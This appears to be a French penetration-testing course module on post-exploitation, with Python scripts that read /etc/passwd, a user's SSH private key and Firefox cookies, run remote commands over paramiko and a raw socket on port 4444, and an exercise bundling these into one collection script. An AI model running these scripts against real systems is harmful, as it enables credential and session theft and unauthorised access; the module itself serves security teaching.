### 🟢 Module 5 : Post-exploitation et élévation de privilèges

**Objectif du module :**  
Automatiser la collecte d’informations après compromission d’un système. Ce module couvre la récupération d'informations sensibles, l'analyse de fichiers critiques et l'exécution de commandes distantes pour exploiter davantage un système compromis.

---

### **1. Extraction des informations système et utilisateurs**

Après avoir compromis un système, l'attaquant cherche souvent à extraire des informations sur l'hôte et ses utilisateurs pour mieux comprendre l'architecture du système et ses vulnérabilités.

#### **Notions à maîtriser :**
- **Récupération d’informations système (version OS, architecture, etc.)** : Cela permet d'identifier les versions du système d’exploitation, les services actifs et les utilisateurs connectés.
- **Récupération des informations utilisateurs** : Il s'agit d'extraire les informations relatives aux utilisateurs du système, comme leurs identifiants, groupes et privilèges.

#### **Exemples pratiques :**
- **Extraction des informations du système :**
    ```python
    import os

    def get_system_info():
        os_info = os.uname()  # Informations sur le système d'exploitation
        print("OS Info:", os_info)

    get_system_info()
    ```
    Ce script récupère les informations sur le système d'exploitation via la fonction `os.uname()`.

- **Extraction des utilisateurs :**
    ```python
    def get_users():
        with open('/etc/passwd', 'r') as file:
            users = file.readlines()
        for user in users:
            print(user.strip())  # Affiche chaque utilisateur
    get_users()
    ```
    Ce script extrait et affiche la liste des utilisateurs du fichier `/etc/passwd` sur les systèmes UNIX/Linux.

---

### **2. Analyse des fichiers sensibles**

Les **fichiers sensibles** comme `/etc/passwd` et les **clés SSH** contiennent des informations critiques sur les utilisateurs et la configuration du système. Leur accès permet à un attaquant de compromettre davantage le système.

#### **Notions à maîtriser :**
- **Fichier `/etc/passwd`** : Contient des informations sur les utilisateurs et leurs groupes.
- **Fichier `/etc/shadow`** : Contient les informations des mots de passe cryptés des utilisateurs (généralement accessible uniquement aux super-utilisateurs).
- **Clés SSH** : Les clés privées SSH sont essentielles pour les connexions distantes et permettent d’accéder à des systèmes de manière privilégiée.
- **Cookies et fichiers de session** : Peuvent contenir des informations sur les connexions actives et des sessions authentifiées.

#### **Exemples pratiques :**
- **Extraction des clés SSH (fichier `~/.ssh/id_rsa`):**
    ```python
    def get_ssh_keys():
        with open('/home/user/.ssh/id_rsa', 'r') as file:
            ssh_key = file.read()
        print("SSH Private Key: \n", ssh_key)
    get_ssh_keys()
    ```
    Ce script ouvre et lit la clé SSH privée de l'utilisateur.

- **Extraction des cookies depuis un navigateur :**
    ```python
    import os
    import sqlite3

    def get_browser_cookies():
        cookie_db_path = os.path.expanduser('~/.mozilla/firefox/your_profile/cookies.sqlite')
        conn = sqlite3.connect(cookie_db_path)
        cursor = conn.cursor()
        cursor.execute('SELECT * FROM moz_cookies')
        cookies = cursor.fetchall()
        for cookie in cookies:
            print(cookie)  # Affiche chaque cookie
        conn.close()

    get_browser_cookies()
    ```
    Ce script récupère les cookies du navigateur Firefox stockés dans une base de données SQLite.

---

### **3. Exécution de commandes distantes avec `paramiko` et `sockets`**

Une fois qu'un attaquant a compromis un système, il peut vouloir exécuter des commandes à distance sur le système cible pour exfiltrer des informations ou obtenir un contrôle plus poussé.

#### **Notions à maîtriser :**
- **Utilisation de `paramiko` pour SSH** : Permet d'exécuter des commandes à distance sur un serveur via SSH.
- **Utilisation de `sockets` pour l'exécution de commandes à distance** : Permet d'établir une communication via un socket réseau pour envoyer des commandes et récupérer des informations.

#### **Exemples pratiques :**

- **Exécution de commandes à distance avec `paramiko` (via SSH) :**
    ```python
    import paramiko

    def execute_remote_command(host, username, password, command):
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(host, username=username, password=password)
        stdin, stdout, stderr = ssh.exec_command(command)
        print("Output:\n", stdout.read().decode())
        ssh.close()

    host = '192.168.1.100'
    username = 'user'
    password = 'password'
    command = 'ls -la'
    execute_remote_command(host, username, password, command)
    ```
    Ce script utilise `paramiko` pour se connecter à un serveur SSH et exécuter une commande distante (`ls -la`).

- **Exécution de commandes à distance via `sockets` :**
    ```python
    import socket

    def remote_shell(host, port, command):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((host, port))
            s.sendall(command.encode())
            data = s.recv(1024)
        print(f"Received: {data.decode()}")

    host = '192.168.1.100'
    port = 4444
    command = 'cat /etc/passwd'
    remote_shell(host, port, command)
    ```
    Ce script envoie une commande à un serveur distant via un socket et récupère la sortie.

---

### **4. Exercice : Créer un script qui récupère les informations sensibles d’un système compromis**

#### **Instructions de l'exercice :**
1. **Récupérez les informations système** : Utilisez des commandes comme `uname`, `hostname`, et d'autres commandes système pour extraire des informations sur l'architecture du système et la version de l'OS.
2. **Extraire les informations sensibles** : Lisez les fichiers tels que `/etc/passwd`, les clés SSH et les cookies du navigateur.
3. **Exécuter des commandes à distance** : Utilisez `paramiko` pour exécuter des commandes sur un système compromis via SSH ou un serveur de commande par socket.
4. **Stockez les informations extraites** dans un fichier de log pour une analyse future.

#### **Exemple de structure du code :**
```python
import os
import paramiko
import sqlite3

# Extraction des informations système
def get_system_info():
    os_info = os.uname()
    print("OS Info:", os_info)

# Extraction des utilisateurs
def get_users():
    with open('/etc/passwd', 'r') as file:
        users = file.readlines()
    return users

# Extraction des clés SSH
def get_ssh_keys():
    with open('/home/user/.ssh/id_rsa', 'r') as file:
        ssh_key = file.read()
    return ssh_key

# Exécution de commande à distance via SSH
def execute_remote_command(host, username, password, command):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(host, username=username, password=password)
    stdin, stdout, stderr = ssh.exec_command(command)
    print("Command Output: ", stdout.read().decode())
    ssh.close()

# Collecte d'informations
def collect_info():
    print("System Information:")
    get_system_info()
    
    print("Users on the system:")
    users = get_users()
    for user in users:
        print(user.strip())
    
    print("SSH Private Key:")
    ssh_key = get_ssh_keys()
    print(ssh_key)

    print("Executing remote command...")
    host = '192.168.1.100'
    username = 'user'
    password = 'password'
    command = 'cat /etc/passwd'
    execute_remote_command(host, username, password, command)

# Lancer la collecte d'informations
collect_info()
```

---

### **Conclusion du Module 5 :**

À la fin de ce module, vous devriez être capable de :
- Récupérer des informations système sensibles après avoir compromis un système.
- Accéder à des fichiers critiques comme `/etc/passwd`, les clés SSH, et les cookies du navigateur.
- Exécuter des commandes à distance sur un système compromis pour en extraire davantage d'informations.

Ces compétences sont essentielles pour mener à bien des missions de post-exploitation et d'élévation de privilèges, et vous préparent pour des tests d'intrusion complets.